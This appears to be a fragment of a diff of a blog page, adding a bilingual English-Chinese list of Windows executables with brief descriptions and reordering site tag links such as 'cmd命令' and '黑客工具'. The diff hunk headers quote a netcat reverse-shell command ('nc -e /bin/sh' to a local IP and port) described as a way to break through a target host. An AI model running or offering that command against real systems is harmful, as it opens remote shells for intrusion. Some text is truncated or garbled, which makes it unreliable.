+<p>sndrec32.exe &gt; starts the windows sound recorder 录音机 </p>
+<p>sndvol32.exe &gt; display the current volume information 显示声音控制信息 </p>
+<p>snmp.exe &gt; simple network management protocol used for network mangement 简单网络管理协议 </p>
+<p>snmptrap.exe &gt; utility used with snmp snmp工具 </p>
+<p>sol.exe &gt; windows solitaire game 纸牌 </p>
+<p>sort.exe &gt; compares files and folders 读取输入、排序数据并将结果写到屏幕、文件和其他设备上 </p>
+<p>spoolsv.exe &gt; part of the spooler service for printing 打印池服务的一部分 </p>
+<p>sprestrt.exe &gt; </p>
+<p>srvmgr.exe &gt; starts the windows server manager 服务器管理器 </p>
+<p>stimon.exe &gt; wdm stillimage- &gt; monitor </p>
+<p>stisvc.exe &gt; wdm stillimage- &gt; service </p>
+<p>subst.exe &gt; associates a path with a drive letter 将路径与驱动器盘符关联 </p>
+<p>svchost.exe &gt; svchost.exe is a generic host process name for services that are run from dynamic-link libraries (dlls). dll得主进程 </p>
+<p>syncapp.exe &gt; creates windows briefcase. 创建windows文件包 </p>
+<p>sysedit.exe &gt; opens editor for 4 system files 系统配置编辑器 </p>
+<p>syskey.exe &gt; encrypt and secure system database nt账号数据库按群工具 </p>
+<p>sysocmgr.exe &gt; windows 2000 setup 2000安装程序 </p>
+<p>systray.exe &gt; starts the systray in the lower right corner. 在低权限运行systray </p>
+<p>taskman.exe &gt; task manager 任务管理器 </p>
+<p>taskmgr.exe &gt; starts the windows 2000 task manager 任务管理器 </p>
+<p>tcmsetup.exe &gt; telephony client wizard 电话服务客户安装 </p>
+<p>tcpsvcs.exe &gt; tcp services tcp服务 </p>
+<p>.exe &gt; telnet utility used to connect to telnet server </p>
+<p>termsrv.exe &gt; terminal server 终端服务 </p>
+<p>tftp.exe &gt; trivial ftp 将文件传输到正在运行 tftp 服务的远程计算机或从正在运行 tftp 服务的远程计算机传输文件 </p>
+<p>tftpd.exe &gt; trivial ftp daemon </p>
+<p>themes.exe &gt; change windows themes 桌面主题 </p>
+<p>tlntadmn.exe &gt; telnet server administrator telnet服务管理 </p>
+<p>tlntsess.exe &gt; display the current telnet sessions 显示目前的telnet会话 </p>
+<p>tlntsvr.exe &gt; start the telnet server 开始telnet服务 </p>
+<p>tracert.exe &gt; trace a route to display paths 该诊断实用程序将包含不同生存时间 (ttl) 值的 internet 控制消息协议 (icmp) 回显数据包发送到目标，以决定到达目标采用的路由 </p>
+<p>tsadmin.exe &gt; terminal server administrator 终端服务管理器 </p>
+<p>tscon.exe &gt; attaches a user session to a terminal session. 粘贴用户会话到终端对话 </p>
+<p>tsdiscon.exe &gt; disconnect a user from a terminal session 断开终端服务的用户 </p>
+<p>tskill.exe &gt; kill a terminal server process 杀掉终端服务 </p>
+<p>tsprof.exe &gt; used with terminal server to query results. 用终端服务得出查询结果 </p>
+<p>tsshutdn.exe &gt; shutdown the system 关闭系统 </p>
+<p>unlodctr.exe &gt; part of performance monitoring 性能监视器的一部分 </p>
+<p>upg351db.exe &gt; upgrade a jet database 升级jet数据库 </p>
+<p>ups.exe &gt; ups service ups服务 </p>
+<p>user.exe &gt; core windows service windows核心服务 </p>
+<p>userinit.exe &gt; part of the winlogon process winlogon进程的一部分 </p>
+<p>usrmgr.exe &gt; start the windows user manager for domains 域用户管理器 </p>
+<p>utilman.exe &gt; this tool enables an administrator to designate which computers automatically open accessibility tools when windows 2000 starts. 指定2000启动时自动打开那台机器 </p>
+<p>verifier.exe &gt; driver verifier manager driver verifier manager </p>
+<p>vwipxspx.exe &gt; loads ipx/spx vdm 调用ipx/spx vdm </p>
+<p>w32tm.exe &gt; windows time server 时间服务器 </p>
+<p>wextract.exe &gt; used to extract windows files 解压缩windows文件 </p>
+<p>winchat.exe &gt; opens windows chat 打开windows聊天 </p>
 
       
 
@@ -571,11 +898,11 @@ nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主�
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
+                <a href="javascript:void(0)" class="js-tag color2">java thread</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">java thread</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -591,15 +918,15 @@ nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主�
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">eclipseForJava</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">cmd命令</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">黑客工具</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">eclipseForJava</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -615,11 +942,11 @@ nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主�
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">links</a>
+                <a href="javascript:void(0)" class="js-tag color4">jsp</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">jsp</a>
+                <a href="javascript:void(0)" class="js-tag color1">links</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -635,11 +962,11 @@ nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主�
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">tomcat</a>
+                <a href="javascript:void(0)" class="js-tag color1">nginx</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">nginx</a>
+                <a href="javascript:void(0)" class="js-tag color2">tomcat</a>
               </li>
              
               <li class="article-tag-list-item">
